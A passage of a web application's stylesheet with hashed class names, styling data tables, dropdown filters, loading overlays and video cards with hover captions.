        max-width: 100%;
        width: 100%
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .OSOJGvXI8fHB1YLv8tW_k ._3nA3C53M4bPyTi-REL_MEp .-RgyB-Ve7zg1kvThzRbvl {
        padding-left: 10px
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .OSOJGvXI8fHB1YLv8tW_k ._3nA3C53M4bPyTi-REL_MEp .-RgyB-Ve7zg1kvThzRbvl .EKOUH-76F9Ni79asreZxG {
        display: -webkit-box;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        overflow: hidden;
        text-overflow: ellipsis
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .OSOJGvXI8fHB1YLv8tW_k ._3nA3C53M4bPyTi-REL_MEp .-RgyB-Ve7zg1kvThzRbvl .EKOUH-76F9Ni79asreZxG:hover {
        color: var(--ah-primary-hover)
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .OSOJGvXI8fHB1YLv8tW_k ._3nA3C53M4bPyTi-REL_MEp .-RgyB-Ve7zg1kvThzRbvl ._2CMmWTshTOpMHeyuZvRqGw {
        display: flex;
        align-items: center;
        margin-top: 5px
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .OSOJGvXI8fHB1YLv8tW_k ._3nA3C53M4bPyTi-REL_MEp .-RgyB-Ve7zg1kvThzRbvl ._2CMmWTshTOpMHeyuZvRqGw span {
        display: inline-flex
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .OSOJGvXI8fHB1YLv8tW_k ._3mdzV9Hg2PUfRBdyXGQ4gW {
        display: grid;
        grid-template-columns: 100px 100px 100px
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .OSOJGvXI8fHB1YLv8tW_k ._3mdzV9Hg2PUfRBdyXGQ4gW .PBy4UxMk52-7ed-CQlxuJ {
        color: #2e2e2e
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .OSOJGvXI8fHB1YLv8tW_k ._3mdzV9Hg2PUfRBdyXGQ4gW ._2Xnu_KIj1d5chkUoFQFU6k {
        font-size: 14px;
        font-weight: 700;
        color: #2e2e2e
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .FVZxDYt4mrsxOLEoPMen {
        position: relative;
        padding-top: 20px
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E {
        display: table;
        width: 100%
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E .ZokmmVTPmsHQMptWXTxPi {
        display: table-header-group
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E .ZokmmVTPmsHQMptWXTxPi ._1Y3At_YrG1Xd7PcTpewzpm {
        display: table-row
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E .ZokmmVTPmsHQMptWXTxPi ._1Y3At_YrG1Xd7PcTpewzpm .C1Us060Pn7mNNwmFOOtky {
        display: table-cell;
        padding: 13px 10px;
        background: #e9e9e9;
        font-weight: 500
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E .ZokmmVTPmsHQMptWXTxPi ._1Y3At_YrG1Xd7PcTpewzpm .C1Us060Pn7mNNwmFOOtky._2jWWhlZotppT6GB-JEjtMD {
        width: 35%
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E .ZokmmVTPmsHQMptWXTxPi ._1Y3At_YrG1Xd7PcTpewzpm .C1Us060Pn7mNNwmFOOtky._3ojdBsGyW3YKJXG1jh099V {
        width: 15%
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E .ZokmmVTPmsHQMptWXTxPi ._1Y3At_YrG1Xd7PcTpewzpm .C1Us060Pn7mNNwmFOOtky._1aKnbmqakcu-VjjHnTlI4L {
        width: 25%
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E .ZokmmVTPmsHQMptWXTxPi ._1Y3At_YrG1Xd7PcTpewzpm .C1Us060Pn7mNNwmFOOtky._3zSex7Aevh4D5LtOmGZcoG {
        width: 15%
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E .ZokmmVTPmsHQMptWXTxPi ._1Y3At_YrG1Xd7PcTpewzpm .C1Us060Pn7mNNwmFOOtky:first-child {
        border-top-left-radius: 4px;
        border-bottom-left-radius: 4px
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E .ZokmmVTPmsHQMptWXTxPi ._1Y3At_YrG1Xd7PcTpewzpm .C1Us060Pn7mNNwmFOOtky:last-child {
        border-top-right-radius: 4px;
        border-bottom-right-radius: 4px
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg {
        display: table-header-group
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm {
        display: table-row
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX {
        display: table-cell;
        padding: 14px 10px;
        text-align: left;
        vertical-align: middle;
        border-bottom: 1px solid #e2e4e5
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX._1Y6oHwNP57ywFgWOgY9lpH * {
        cursor: pointer
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._11Vt3gfwtX1fyqtFeypCgC {
        width: 32px;
        height: 32px;
        border-radius: 4px;
        overflow: hidden
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX .EKOUH-76F9Ni79asreZxG {
        max-width: 280px;
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
        overflow: hidden;
        min-height: 24px;
        margin-left: 16px
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX .EKOUH-76F9Ni79asreZxG:hover {
        color: var(--ah-primary-hover)
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._10qk33XYDyNqr-i0kGklKQ {
        position: absolute;
        top: 0;
        right: 0;
        left: 0;
        bottom: 0;
        border-radius: 4px;
        background-color: rgba(0, 0, 0, 0.7);
        display: flex;
        align-items: center;
        justify-content: center
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX._3qeNxqFxd3aByQeEKczvQs>span {
        display: flex;
        align-items: center
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX._3qeNxqFxd3aByQeEKczvQs>span span {
        display: inline-flex;
        margin-right: 5px
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._20vSmxJlVoscpA0CWJGKwh,
    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._11sRKgv5IzYKDsERAkw9rG {
        color: #21a67a;
        display: flex;
        align-items: center
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._20vSmxJlVoscpA0CWJGKwh svg,
    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._11sRKgv5IzYKDsERAkw9rG svg {
        margin-left: 5px;
        width: 8px !important
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._20vSmxJlVoscpA0CWJGKwh svg,
    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._20vSmxJlVoscpA0CWJGKwh path,
    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._11sRKgv5IzYKDsERAkw9rG svg,
    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._11sRKgv5IzYKDsERAkw9rG path {
        fill: #21a67a
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._2DHkj0dlk2NyiO_oNpQRrq,
    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._13dCJiEyJCmMNa7nOA1XcU {
        color: #e9162b;
        display: flex;
        align-items: center
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._2DHkj0dlk2NyiO_oNpQRrq svg,
    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._13dCJiEyJCmMNa7nOA1XcU svg {
        margin-left: 5px;
        width: 8px !important
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._2DHkj0dlk2NyiO_oNpQRrq svg,
    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._2DHkj0dlk2NyiO_oNpQRrq path,
    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._13dCJiEyJCmMNa7nOA1XcU svg,
    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX ._13dCJiEyJCmMNa7nOA1XcU path {
        fill: #e9162b
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX._16oMfv67tJ8NpVf5cB_j9P {
        white-space: nowrap
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso .TuvCYpbIH2-ntp5v14W2E ._1a3IKXvVraVsLU-ZO6Z3pg ._1Y3At_YrG1Xd7PcTpewzpm ._1ZA2FzevduuzsrJCIYHpYX._16oMfv67tJ8NpVf5cB_j9P span {
        display: inline-flex
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._3yrd538xSediVeyZpWFVAd {
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._27GVyGku4DRaRX8JTmxlJ8 {
        position: absolute;
        top: 0;
        right: -20px;
        bottom: 0;
        left: -20px;
        background: rgba(0, 0, 0, 0.7);
        display: flex;
        align-items: center;
        justify-content: center;
        border-radius: 0 0 8px 8px;
        z-index: 100
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._27GVyGku4DRaRX8JTmxlJ8 ._1S6o2thbJ3UzHtUV2at3_c {
        display: flex;
        flex-direction: column;
        align-items: center
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._27GVyGku4DRaRX8JTmxlJ8 ._1S6o2thbJ3UzHtUV2at3_c ._3D7Cyt7DkDxkxEgHAnc1A8 {
        font-size: 20px;
        font-weight: 600;
        color: #fff
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._27GVyGku4DRaRX8JTmxlJ8 ._1S6o2thbJ3UzHtUV2at3_c ._2djRwuK3lsHqlFwec0F6Qv {
        margin-top: 20px
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._27GVyGku4DRaRX8JTmxlJ8 ._1S6o2thbJ3UzHtUV2at3_c ._2s5S80agy2FG7WkGMdixTV {
        margin-top: 30px
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._27GVyGku4DRaRX8JTmxlJ8 ._1S6o2thbJ3UzHtUV2at3_c ._3oL02M590pX6Kf-FmL_4cQ {
        color: #fff;
        margin-top: 10px
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._27GVyGku4DRaRX8JTmxlJ8 ._1S6o2thbJ3UzHtUV2at3_c ._3oL02M590pX6Kf-FmL_4cQ span {
        display: inline-block;
        color: #0080f7
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._3hDQM_xz2BdSjdFC2-fus6 {
        padding: 20px 0;
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._3hDQM_xz2BdSjdFC2-fus6 div {
        cursor: pointer
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._3hDQM_xz2BdSjdFC2-fus6 span {
        color: #006fe3;
        font-weight: 600;
        display: flex;
        justify-content: center;
        cursor: pointer
    }

    ._AAo-MFO_Gj0P5Oam-8aO.Q4Lbs_R63Tle4lR8AfGso ._3QuXBhIZb8BQmTDNX8opGJ {
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn {
        margin-top: 20px;
        padding-bottom: 20px
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn ._3imB0QE7bIP388hU_Ze_O4 {
        display: grid;
        grid-template-columns: 1fr 1fr 1fr;
        gap: 24px;
        margin-bottom: 24px
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn .URSJcjZFJ5kPigJYn94MX {
        margin-bottom: 12px;
        color: #262626;
        font-size: 18px;
        line-height: 26px;
        font-weight: 500
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn .BktvHUXd2GrQBP64M5uwI {
        display: flex;
        margin-bottom: 20px
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn .BktvHUXd2GrQBP64M5uwI ._2qKlaCV7-fpOrA90A3_BbA {
        margin-right: 24px
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn .BktvHUXd2GrQBP64M5uwI ._2qKlaCV7-fpOrA90A3_BbA .HN2PoFM86pUBkARCr7O_1 {
        position: relative
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn .BktvHUXd2GrQBP64M5uwI ._2qKlaCV7-fpOrA90A3_BbA .HN2PoFM86pUBkARCr7O_1 .Eub8ZiX-1qYpahxxBJpdX {
        position: absolute;
        right: 2px;
        top: 50%;
        transform: translateY(-50%);
        display: inline-flex;
        z-index: 1
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn .BktvHUXd2GrQBP64M5uwI ._2qKlaCV7-fpOrA90A3_BbA select {
        border: 1px solid #9d9d9d;
        height: 32px;
        padding: 0px 11px;
        display: flex;
        min-width: 100px;
        background: #ffffff;
        cursor: pointer;
        justify-content: space-between;
        align-items: center;
        border-radius: 4px;
        font-size: 14px;
        min-width: 177px;
        z-index: 3;
        background: transparent
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn .BktvHUXd2GrQBP64M5uwI ._2qKlaCV7-fpOrA90A3_BbA ._3Q6CchCLH4wzB51WqqnJ51 {
        margin-bottom: 6px;
        color: rgba(0, 0, 0, 0.85)
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn ._1fTTN-CqDl7yTLWHuN73Wu {
        display: flex;
        text-align: center !important;
        flex-direction: column;
        justify-content: center
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn ._1fTTN-CqDl7yTLWHuN73Wu>div {
        text-align: center;
        cursor: pointer;
        color: var(--ah-secondary)
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn ._1fTTN-CqDl7yTLWHuN73Wu ._1ifQlsWOIZZsaiBL5h8iQY {
        text-align: center
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn ._1fTTN-CqDl7yTLWHuN73Wu ._1ifQlsWOIZZsaiBL5h8iQY svg {
        height: 16px !important;
        cursor: pointer
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn ._1fTTN-CqDl7yTLWHuN73Wu ._1ifQlsWOIZZsaiBL5h8iQY svg path {
        fill: var(--ah-secondary)
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn ._2qEhg9nRz0QSFI8cjm61kN {
        position: absolute;
        width: 100%;
        height: 100%;
        z-index: 99;
        display: flex;
        align-items: center;
        flex-direction: column;
        justify-content: center
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn ._2qEhg9nRz0QSFI8cjm61kN svg {
        height: 16px !important;
        color: #fff
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn ._2qEhg9nRz0QSFI8cjm61kN ._2WVvjh9xrW6rPnvxO2xpNl {
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.7);
        position: absolute;
        width: 100%;
        border-radius: 6px;
        z-index: 2
    }

    ._1Onet4TmITxqhwiGycU9Ft .xgLKGloJY9xQjCnHJ-exn ._2qEhg9nRz0QSFI8cjm61kN>div:not(._2WVvjh9xrW6rPnvxO2xpNl) {
        position: relative;
        z-index: 4;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        gap: 12px
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr {
        position: relative;
        border-radius: 4px;
        overflow: hidden;
        background: lightgray;
        cursor: pointer
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr>* {
        cursor: pointer
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr video {
        width: 100% !important;
        height: 420px !important;
        object-fit: cover !important;
        overflow: hidden !important
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr ._1HVsVbIXlhP8N3Dg8s0Ny_ {
        border-radius: 50%;
        width: 40px;
        height: 40px;
        background: rgba(255, 255, 255, 0.2);
        overflow: hidden;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr .h93ldXXHiyTRUu9P6n0TY {
        position: absolute;
        bottom: 0;
        left: 0;
        right: 0;
        z-index: 9;
        background: rgba(0, 0, 0, 0.7);
        padding-top: 8px;
        padding-bottom: 8px
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr .h93ldXXHiyTRUu9P6n0TY ._1J6U1kS1K9x9fK6WgoKTHF {
        display: flex
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr .h93ldXXHiyTRUu9P6n0TY .Av_AjfshtAh5z1G11LwlL {
        width: 100%
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr .h93ldXXHiyTRUu9P6n0TY .Av_AjfshtAh5z1G11LwlL>div {
        text-align: center;
        color: #fff
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr .h93ldXXHiyTRUu9P6n0TY ._3CO7D5ktF6YXdpBZKPeAdP {
        overflow: hidden;
        max-height: 0;
        transition: 0.3s;
        padding-left: 12px;
        padding-right: 12px
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr .h93ldXXHiyTRUu9P6n0TY ._3CO7D5ktF6YXdpBZKPeAdP ._1xojWol8VVm83fggURbGKP {
        display: flex;
        align-items: center;
        color: #fff;
        margin-bottom: 6px
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr .h93ldXXHiyTRUu9P6n0TY ._3CO7D5ktF6YXdpBZKPeAdP ._1xojWol8VVm83fggURbGKP img {
        margin-right: 8px;
        min-width: 32px;
        max-width: 32px;
        height: 32px;
        border-radius: 50%;
        overflow: hidden;
        object-fit: cover
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr .h93ldXXHiyTRUu9P6n0TY ._3CO7D5ktF6YXdpBZKPeAdP ._1xojWol8VVm83fggURbGKP span {
        color: #fff;
        display: block;
        display: -webkit-box !important;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 1;
        overflow: hidden;
        text-overflow: ellipsis;
        word-break: break-all
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr .h93ldXXHiyTRUu9P6n0TY ._3CO7D5ktF6YXdpBZKPeAdP ._2J42hBUcoKIBx9Q8HV3WPn {
        color: #fff;
        display: block;
        display: -webkit-box !important;
        -webkit-box-orient: vertical;
        -webkit-line-clamp: 2;
        overflow: hidden;
        text-overflow: ellipsis;
        margin-bottom: 6px;
        word-break: break-all
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr .h93ldXXHiyTRUu9P6n0TY ._3CO7D5ktF6YXdpBZKPeAdP ._2bBB6vm2kZCeHAMDKPnxq4 {
        display: flex
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr .h93ldXXHiyTRUu9P6n0TY ._3CO7D5ktF6YXdpBZKPeAdP ._2bBB6vm2kZCeHAMDKPnxq4>span {
        margin-right: 8px;
        display: inline-block;
        color: #fff
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr:hover ._1HVsVbIXlhP8N3Dg8s0Ny_ {
        display: none
    }

    ._2OJoCnkS9lCgjdiABYcJsF .wxyVpkM9qU_ayGrRAWQEr:hover .h93ldXXHiyTRUu9P6n0TY ._3CO7D5ktF6YXdpBZKPeAdP {
        max-height: 200px
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu {
        margin-top: 20px;
        padding-bottom: 20px
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu .-r77hNvzweblNDxalw-o3 {
        display: flex;
        margin-bottom: 20px
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu .-r77hNvzweblNDxalw-o3 ._3BveaJMo0_RPWmaoHh4FMk {
        margin-right: 24px
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu .-r77hNvzweblNDxalw-o3 ._3BveaJMo0_RPWmaoHh4FMk ._2bamWRVf6mokW9kz2FpOHj {
        position: relative
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu .-r77hNvzweblNDxalw-o3 ._3BveaJMo0_RPWmaoHh4FMk ._2bamWRVf6mokW9kz2FpOHj ._1_uwR4kLocmG878dQjtJli {
        position: absolute;
        right: 2px;
        top: 50%;
        transform: translateY(-50%);
        display: inline-flex;
        z-index: 1
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu .-r77hNvzweblNDxalw-o3 ._3BveaJMo0_RPWmaoHh4FMk select {
        border: 1px solid #9d9d9d;
        height: 32px;
        padding: 0px 11px;
        display: flex;
        min-width: 100px;
        background: #ffffff;
        cursor: pointer;
        justify-content: space-between;
        align-items: center;
        border-radius: 4px;
        font-size: 14px;
        min-width: 177px;
        z-index: 3;
        background: transparent
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu .-r77hNvzweblNDxalw-o3 ._3BveaJMo0_RPWmaoHh4FMk ._31Z_fSrEm_WdGzFqOxu7vd {
        margin-bottom: 6px;
        color: rgba(0, 0, 0, 0.85)
    }

    ._3EHqGMf4sHsZfd1LPUotR8 ._1cPk51DsvDtWQ4WKRJBoeu ._2xzKyZruuebWTo5JD7JiH2 {
        display: table;
        width: 100%
    }

